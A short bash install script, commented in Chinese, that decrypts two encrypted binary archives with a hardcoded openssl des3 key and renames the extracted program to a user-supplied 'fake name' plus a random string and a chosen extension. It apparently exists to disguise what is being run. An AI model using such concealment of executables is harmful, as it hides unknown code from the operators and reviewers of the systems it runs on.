#!/bin/bash

echo 'installing..'

#完善相關基本信息--------------------------------------------------------
echo -n "App's kano title > "
read fakename
echo "$fakename""." > Config/1-alice

echo -n "File type > "
read type
echo ".""$type" > Config/2-type
sleep 10

#生成隨機字符------------------------------------------------------------
cat /dev/urandom | tr -dc A-Za-z0-4 | head -c 9 > Config/random &
sleep 10

#生成文件---------------------------------------------------------------
dd if=Bin/jekyll-s390x.spk |openssl des3 -d -k 8ddefff7-f00b-46f0-ab32-2eab1d227a61|tar zxf -
sleep 1
dd if=Bin/caddy-s390x.spk |openssl des3 -d -k 8ddefff7-f00b-46f0-ab32-2eab1d227a61|tar zxf -
sleep 8

#自動重命名--------------------------------------------------------------
mv jekyll-s390x `cat Config/1-alice``cat Config/random`-s390x`cat Config/2-type`

echo 'done'
